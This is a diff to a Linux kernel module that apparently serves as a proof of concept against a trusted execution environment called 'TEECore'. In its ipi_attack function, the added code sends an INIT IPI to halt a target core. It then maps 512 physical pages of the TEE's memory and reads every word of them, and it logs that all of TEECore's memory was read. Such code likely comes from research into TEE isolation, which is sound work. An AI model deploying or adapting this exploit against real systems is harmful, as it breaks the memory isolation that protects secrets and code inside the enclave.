@@ -14,6 +14,7 @@ static struct shared_mem *SHARED_MEM_PTR = NULL;
 static struct timer_list POLL_TIMER;
 static u8 waiting = 0;
 static int apic_id = 0;
+static u64 physical_entry_addr = 0;
 
 void ping_app(void);
 void attack_mem(enum tee_task task);
@@ -66,12 +67,13 @@ static void tee_poll_timer_handler(struct timer_list *timer)
 	mod_timer(&POLL_TIMER, jiffies + msecs_to_jiffies(750));
 }
 
-int init_mgmt_module(u8 *shared_mem_ptr, int target_id) {
+int init_mgmt_module(u8 *shared_mem_ptr, int target_id, u64 entry_phys) {
 	pr_info("%s: Install NMI handler\n", __FUNCTION__);
 	SHARED_MEM_PTR = (struct shared_mem*) shared_mem_ptr;
 	timer_setup(&POLL_TIMER, tee_poll_timer_handler, 0);
 	mod_timer(&POLL_TIMER, jiffies + msecs_to_jiffies(750));
 	apic_id = target_id;
+	physical_entry_addr = entry_phys;
 
 	return 0; 
 }
@@ -86,6 +88,8 @@ void write_to_com_mem(void* buffer, size_t len) {
 
 void ipi_attack(void) {
 	unsigned long flags;
+	u64 pfn_start = physical_entry_addr >> 12;
+	u64 hash = 0;
 
 	local_irq_save(flags);
 
@@ -94,6 +98,21 @@ void ipi_attack(void) {
 	lapic_send_init_ipi_waiting(apic_id);
 
 	local_irq_restore(flags);
+
+	// Map all 2 MiB of memory allocated for the ELF (see. elf_reader)
+	// 2 MiB of memory, 4 Kib per page ~> 512 pages to map
+	for (size_t pfn_offset = 0; 512 > pfn_offset; ++pfn_offset) 
+	{
+		struct page* target_page = pfn_to_page(pfn_start + pfn_offset);
+		u32* base_addr = kmap(target_page);
+		// There are 1024 4-byte elements in one page
+		for (size_t offset = 0; offset < 1024; ++offset) 
+		{
+			hash += ioread32(base_addr + offset);
+		}
+		kunmap(target_page);
+	}
+	pr_info("Read all of TEECore's memory! All bytes added are: 0x%016llx\n", hash);
 }
 
 void ping_app(void) {
